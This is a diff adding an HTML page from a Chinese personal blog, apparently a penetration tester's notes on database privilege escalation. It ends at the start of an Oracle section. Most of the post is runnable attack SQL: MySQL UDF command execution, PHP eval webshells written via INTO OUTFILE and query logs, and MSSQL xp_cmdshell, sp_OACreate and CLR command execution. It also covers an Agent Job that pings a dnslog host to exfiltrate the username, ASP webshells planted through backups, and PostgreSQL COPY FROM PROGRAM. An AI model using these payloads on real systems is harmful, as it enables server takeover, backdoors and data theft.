@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="mayylu">
+
+
+
+    <meta name="description" content="学习是一种生活态度">
+
+
+
+<title>数据库提权 | mayylu&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/vue.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">mayylu&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">mayylu&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">数据库提权</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">mayylu</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">七月 21, 2024&nbsp;&nbsp;</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/server/">server</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为数据库提权不仅可以内网渗透中使用，外网也有可能出现数据库弱口令或未授权的情况，故单独摘出来，简单总结一下遇到的提权手段和版本限制</p>
+<span id="more"></span>
+
+
+<h2 id="mysql-提权"><a href="#mysql-提权" class="headerlink" title="mysql 提权"></a>mysql 提权</h2><h3 id="secure-file-priv限制"><a href="#secure-file-priv限制" class="headerlink" title="secure_file_priv限制"></a>secure_file_priv限制</h3><p>无论是UDF还是写文件都得有写的权限<br>如果secure_file_priv=NULL，MYSQL服务会禁止导入和导出操作。(默认值)<br>如果secure_file_priv=/tmp/，MYSQL服务只能在/tmp/目录下导入和导出<br>如果secure_file_priv=”” ，MYSQL服务导入和导出不做限制</p>
+<h3 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h3><p>UDF（user defined function）<strong>用户自定义函数</strong>，是 MySQL 的一个扩展接口，称为用户自定义函数，是用来拓展MySQL的技术手段，用户通过自定义函数来实现在MySQL中无法实现的功能。文件后缀为.dll或.so，常用C、C++语言编写</p>
+<p><strong>MySQL &gt;= 5.1</strong> 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 <strong>lib\plugin文件夹</strong>下才能创建自定义函数</p>
+<ol>
+<li>查找插件库的路径<br><code>show variables like &#39;%plugin%&#39;</code></li>
+<li>将so文件的内容解码，写入到mysql插件库目录中<br><code>select unhex(&#39;so文件的16进制编码&#39;) into dumpfile &#39;/usr/lib64/mysql/plugin/xxx.so&#39;</code>win就是dll文件</li>
+<li>创建函数<br><code>create function sys_eval returns string soname &#39;xxx.so&#39;;</code></li>
+<li>执行系统命令<br><code>select * from mysql.func;</code><br><code>select sys_eval(&quot;whoami&quot;);</code></li>
+</ol>
+<h3 id="写文件的方法"><a href="#写文件的方法" class="headerlink" title="写文件的方法"></a>写文件的方法</h3><p>现在我们已经获取了sql语句的执行权限，现在我们开始想办法上传shell</p>
+<h4 id="into-outfile-不常用"><a href="#into-outfile-不常用" class="headerlink" title="into outfile(不常用)"></a>into outfile(不常用)</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--union select写入</span></span><br><span class="line"> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="string">&#x27;&lt;?php phpinfo() ?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/wamp64/www/work/WebShell.php&#x27;</span></span><br><span class="line"><span class="comment">--lines terminated by 以每行终止的位置添加 xx 内容。</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/wamp64/www/work/Webshell.php&#x27;</span> lines terminated <span class="keyword">by</span> <span class="string">&#x27;&lt;?php phpinfo() ?&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">--lines starting by 每行开始的位置添加 xx 内容</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.55</span><span class="number">.130</span><span class="operator">/</span>work<span class="operator">/</span>sqli<span class="number">-1.</span>php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/wamp64/www/work/webshell.php&#x27;</span> lines starting <span class="keyword">by</span> <span class="string">&#x27;&lt;?php phpinfo() ?&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">--fields terminated by 每个字段的位置添加 xx 内容</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.55</span><span class="number">.130</span><span class="operator">/</span>work<span class="operator">/</span>sqli<span class="number">-1.</span>php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/wamp64/www/work/webshell.php&#x27;</span> fields terminated <span class="keyword">by</span> <span class="string">&#x27;&lt;?php phpinfo() ?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="写入日志-MySQL-5-0-版本以上会创建日志文件"><a href="#写入日志-MySQL-5-0-版本以上会创建日志文件" class="headerlink" title="写入日志(MySQL 5.0 版本以上会创建日志文件)"></a>写入日志(MySQL 5.0 版本以上会创建日志文件)</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%datadir%&#x27;</span>; <span class="comment">--查看数据库路径</span></span><br><span class="line"><span class="comment">-- 写入常规日志(root权限)</span></span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%general%&#x27;</span> <span class="comment">-- 查看是否开启日志</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> &quot;ON&quot;; <span class="comment">-- general_log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span><span class="string">&#x27;C:/InstalledSoftware/phpstudy_pro/WWW/58/public/config.php&#x27;</span>; <span class="comment">-- 设置日志路径为网站根目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 写入慢查询日志(root)</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> slow_query_log<span class="operator">=</span>&quot;ON&quot;; <span class="comment">-- 开启慢查询日志</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/PHPTutorial/WWW/slow.php&#x27;</span>;  <span class="comment">-- 修改慢查询日志存储路径</span></span><br><span class="line"><span class="keyword">select</span> &quot;&lt;?php @eval($_POST[abc]); ?&gt;&quot; <span class="keyword">from</span> mysql.db <span class="keyword">where</span> sleep(<span class="number">5</span>); <span class="comment">-- 写入shell(慢查询只记录，查询时间超过5秒的操作)</span></span><br></pre></td></tr></table></figure>
+<h4 id="其他位置"><a href="#其他位置" class="headerlink" title="其他位置"></a>其他位置</h4><h5 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h5><p>MOF 提权是一个有历史的漏洞，基本上在 <strong>Windows Server 2003</strong> 的环境下才可以成功。提权的原理是 <code>C:/Windows/system32/wbem/mof/</code> 目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行</p>
+<h5 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h5><p>往启动项路径里面写入脚本，可以利用 <strong>vbs</strong> 执行一些 CMD 命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Windows Server 2003 的启动项路径：</span><br><span class="line">C:\Documents and Settings\Administrator\Start Menu\Programs\Startup</span><br><span class="line">C:\Documents and Settings\All Users\Start Menu\Programs\Startup</span><br><span class="line"></span><br><span class="line"># Windows Server 2008 的启动项路径：</span><br><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>
+
+<h2 id="MSSQL数据库提权"><a href="#MSSQL数据库提权" class="headerlink" title="MSSQL数据库提权"></a>MSSQL数据库提权</h2><p>在 SQL Server 中，<strong>扩展存储过程</strong>（Extended Stored Procedures）是允许 SQL Server 调用外部程序（通常是 DLL 文件）的机制</p>
+<p>以下要求当前用户必须具有 <strong>DBA权限(sa用户)</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 首先判断当前是否为DBA权限，为1则可以提权</span></span><br><span class="line"><span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;sysadmin&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="xp-cmdshell-sql-server-2005版本以后默认关闭"><a href="#xp-cmdshell-sql-server-2005版本以后默认关闭" class="headerlink" title="xp_cmdshell(sql server 2005版本以后默认关闭)"></a>xp_cmdshell(sql server 2005版本以后默认关闭)</h3><p>xp_cmdshell 是 Sql Server 中的一个组件，我们可以用它来执行系统命令，任何输出都作为文本返回</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--判断xp_cmdshell是否存在</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> master.dbo.sysobjects <span class="keyword">where</span> xtype <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> name <span class="operator">=</span> <span class="string">&#x27;xp_cmdshell&#x27;</span>;</span><br><span class="line"><span class="comment">--显示高级配置选项</span></span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span> ;</span><br><span class="line">reconfigure;</span><br><span class="line"><span class="comment">--允许 SQL Server 执行操作系统命令</span></span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span> ;</span><br><span class="line">reconfigure;</span><br><span class="line"><span class="comment">--执行系统命令</span></span><br><span class="line"><span class="keyword">exec</span> master..xp_cmdshell whoami;</span><br></pre></td></tr></table></figure>
+<h3 id="SP-OACreate-Ole-Automation-Procedures"><a href="#SP-OACreate-Ole-Automation-Procedures" class="headerlink" title="SP_OACreate(Ole Automation Procedures)"></a>SP_OACreate(Ole Automation Procedures)</h3><p>OLE Automation 是一种允许应用程序通过 OLE（对象链接和嵌入）技术与其他应用程序和服务进行交互的机制。它主要用于在不同的应用程序之间实现<strong>对象的创建和操作</strong>，使得在一个应用程序中可以控制另一个应用程序的功能</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--判断SP_OACREATE是否存在</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> master.dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> name<span class="operator">=</span><span class="string">&#x27;SP_OACREATE&#x27;</span>;</span><br><span class="line"><span class="comment">-- 开启组件</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure reconfigure</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure reconfigure</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 执行命令，调用WScript.Shell脚本对象执行系统命令</span></span><br><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@object</span> <span class="type">INT</span>, <span class="variable">@object2</span> <span class="type">INT</span>, <span class="variable">@object3</span> <span class="type">INT</span>, <span class="variable">@str</span> <span class="type">VARCHAR</span>(<span class="number">8000</span>)</span><br><span class="line"><span class="keyword">EXEC</span> sp_OACreate <span class="string">&#x27;WScript.Shell&#x27;</span>, <span class="variable">@object</span> OUTPUT</span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@object</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="variable">@object2</span> OUTPUT, <span class="string">&#x27;C:\Windows\System32\cmd.exe /c whoami&#x27;</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@object2</span>, <span class="string">&#x27;StdOut&#x27;</span>, <span class="variable">@object3</span> OUTPUT</span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@object3</span>, <span class="string">&#x27;readall&#x27;</span>, <span class="variable">@str</span> OUTPUT</span><br><span class="line"><span class="keyword">SELECT</span> <span class="variable">@str</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="Agent-Job-代理执行计划任务"><a href="#Agent-Job-代理执行计划任务" class="headerlink" title="Agent Job 代理执行计划任务"></a>Agent Job 代理执行计划任务</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 开启 sqlagent 服务</span></span><br><span class="line"><span class="keyword">exec</span> master.dbo.xp_servicecontrol <span class="string">&#x27;start&#x27;</span>,<span class="string">&#x27;SQLSERVERAGENT&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--利用计划任务命令执行,由于是无回显，可以使用dnslog外带</span></span><br><span class="line">use msdb;</span><br><span class="line"><span class="keyword">exec</span> sp_delete_job <span class="keyword">null</span>,<span class="string">&#x27;test&#x27;</span></span><br><span class="line"><span class="keyword">exec</span> sp_add_job <span class="string">&#x27;test&#x27;</span></span><br><span class="line"><span class="keyword">exec</span> sp_add_jobstep <span class="keyword">null</span>,<span class="string">&#x27;test&#x27;</span>,<span class="keyword">null</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;cmdexec&#x27;</span>,<span class="string">&#x27;cmd.exe /c &quot;ping %USERNAME%.fb7gzla4.dnslog.pw&quot;&#x27;</span></span><br><span class="line"><span class="keyword">exec</span> sp_add_jobserver <span class="keyword">null</span>,<span class="string">&#x27;test&#x27;</span>,@<span class="variable">@servername</span></span><br><span class="line"><span class="keyword">exec</span> sp_start_job <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="CLR-Common-Language-Runtime"><a href="#CLR-Common-Language-Runtime" class="headerlink" title="CLR(Common Language Runtime)"></a>CLR(Common Language Runtime)</h3><p>CLR（公共语言运行时）提供了.NET Framework 的代码执行环境，可以通过 .NET Framework 来编写存储过程、触发器等功能.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--启用CLR，test 是当前指定的数据库</span></span><br><span class="line">sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;RECONFIGURE;</span><br><span class="line">sp_configure <span class="string">&#x27;clr enabled&#x27;</span>,<span class="number">1</span>;RECONFIGURE;</span><br><span class="line"><span class="keyword">ALTER</span> DATABASE [test] <span class="keyword">SET</span> trustworthy <span class="keyword">ON</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 通过 SQL 语句导入程序集</span></span><br><span class="line"><span class="keyword">CREATE</span> ASSEMBLY [Database1]</span><br><span class="line">    <span class="keyword">AUTHORIZATION</span> [dbo]</span><br><span class="line">    <span class="keyword">FROM</span> <span class="number">0x16</span>进制的dll</span><br><span class="line">    <span class="keyword">WITH</span> PERMISSION_SET <span class="operator">=</span> UNSAFE;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 从程序集中创建存储过程 dbo.ExecCommand</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> [dbo].[ExecCommand]</span><br><span class="line"><span class="variable">@cmd</span> NVARCHAR (MAX) <span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">AS</span> <span class="keyword">EXTERNAL</span> NAME [Database1].[StoredProcedures].[ExecCommand]</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 利用创建的存储过程 dbo.ExecCommand 执行系统命令</span></span><br><span class="line"><span class="keyword">exec</span> dbo.ExecCommand &quot;whoami&quot;;</span><br></pre></td></tr></table></figure>
+<h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--获得当前所有驱动器</span></span><br><span class="line"><span class="keyword">exec</span> xp_availablemedia;</span><br><span class="line"><span class="comment">-- 只列 c:\ 文件夹</span></span><br><span class="line"><span class="keyword">exec</span> xp_dirtree <span class="string">&#x27;c:&#x27;</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">exec</span> xp_subdirs &quot;C:\\&quot;</span><br><span class="line"><span class="comment">-- 列 c:\ 文件夹加文件</span></span><br><span class="line"><span class="keyword">exec</span> xp_dirtree <span class="string">&#x27;c:&#x27;</span>,<span class="number">1</span>,<span class="number">1</span></span><br><span class="line"><span class="comment">-- 列出所有 c:\ 文件和目录,子目录,内容会很多,慎用</span></span><br><span class="line"><span class="keyword">exec</span> xp_dirtree <span class="string">&#x27;c:&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 利用存储过程写入一句话</span></span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@o</span> <span class="type">int</span>, <span class="variable">@f</span> <span class="type">int</span>, <span class="variable">@t</span> <span class="type">int</span>, <span class="variable">@ret</span> <span class="type">int</span></span><br><span class="line"><span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;scripting.filesystemobject&#x27;</span>, <span class="variable">@o</span> <span class="keyword">out</span></span><br><span class="line"><span class="keyword">exec</span> sp_oamethod <span class="variable">@o</span>, <span class="string">&#x27;createtextfile&#x27;</span>, <span class="variable">@f</span> <span class="keyword">out</span>, <span class="string">&#x27;C:\www\test.asp&#x27;</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">exec</span> <span class="variable">@ret</span> <span class="operator">=</span> sp_oamethod <span class="variable">@f</span>, <span class="string">&#x27;writeline&#x27;</span>, <span class="keyword">NULL</span>,<span class="string">&#x27;&lt;%execute(request(&quot;a&quot;))%&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 生成差异备份文件,库名为test</span></span><br><span class="line">backup database test <span class="keyword">to</span> disk <span class="operator">=</span> <span class="string">&#x27;c:\www\bak.bak&#x27;</span>;</span><br><span class="line"><span class="comment">-- 创建表：</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> [dbo].[test] ([cmd] [image]);</span><br><span class="line"><span class="comment">-- 插入一句话：&lt;%execute(request(&quot;a&quot;))%&gt;</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test(cmd)  <span class="keyword">values</span>(<span class="number">0x3C25657865637574652872657175657374282261222929253E</span>)</span><br><span class="line"><span class="comment">-- 再次备份,注意路径</span></span><br><span class="line">backup database test <span class="keyword">to</span> disk<span class="operator">=</span><span class="string">&#x27;C:\www\shell.asp&#x27;</span> <span class="keyword">WITH</span> DIFFERENTIAL,FORMAT;</span><br></pre></td></tr></table></figure>
+<h2 id="PostgreSQL提权"><a href="#PostgreSQL提权" class="headerlink" title="PostgreSQL提权"></a>PostgreSQL提权</h2><p>PostgreSQL 是开源的关系数据库，适合需要复杂查询、高度数据完整性和扩展性的应用，如金融服务、GIS 应用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> setting <span class="keyword">FROM</span> pg_settings <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;data_directory&#x27;</span>; <span class="comment">--获取安装目录</span></span><br><span class="line"><span class="keyword">SELECT</span> setting <span class="keyword">FROM</span> pg_settings <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;config_file&#x27;</span>; <span class="comment">--获取配置文件目录</span></span><br><span class="line"><span class="keyword">select</span> inet_server_addr() <span class="comment">--获取Postgres内网ip地址</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="写文件-1"><a href="#写文件-1" class="headerlink" title="写文件"></a>写文件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">copy</span>  (<span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>) <span class="keyword">to</span> <span class="string">&#x27;C:/temp/1.php&#x27;</span>;</span><br><span class="line"><span class="comment">--或</span></span><br><span class="line"><span class="keyword">select</span> lo_from_bytea(<span class="number">12349</span>,<span class="string">&#x27;ffffffff0x&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> lo_export(<span class="number">12349</span>, <span class="string">&#x27;/tmp/ffffffff0x.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="CVE-2019-9193-9-3-11-2"><a href="#CVE-2019-9193-9-3-11-2" class="headerlink" title="CVE-2019-9193(9.3-11.2)"></a>CVE-2019-9193(9.3-11.2)</h3><p>PostpreSQL 9.3-11.2 允许经过身份验证的<strong>superuser</strong>或者<strong>pg_read_server_files</strong>组用户执行任意命令</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="built_in">current_user</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> pg_roles;<span class="comment">--列出数据库中的所有角色及其属性</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> cmd_exec;	<span class="comment">-- 删除你想用来保存命令输出但是可能存在的表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> cmd_exec(cmd_output text);	<span class="comment">-- 创建用来保存命令输出的表</span></span><br><span class="line"><span class="keyword">COPY</span> cmd_exec <span class="keyword">FROM</span> PROGRAM <span class="string">&#x27;whoami&#x27;</span>;	<span class="comment">-- 执行系统命令</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> cmd_exec;	<span class="comment">-- 结果显示</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Oracle提权"><a href="#Oracle提权" class="headerlink" title="Oracle提权"></a>Oracle提权</h2><p>DBA: 拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构。<br>对于普通用户：授予connect, resource权限。<br>对于DBA管理用户：授予connect，resource, dba权限</p>
+<ol>
+<li>通过注入存储过程提权（低权限提升至DBA）</li>
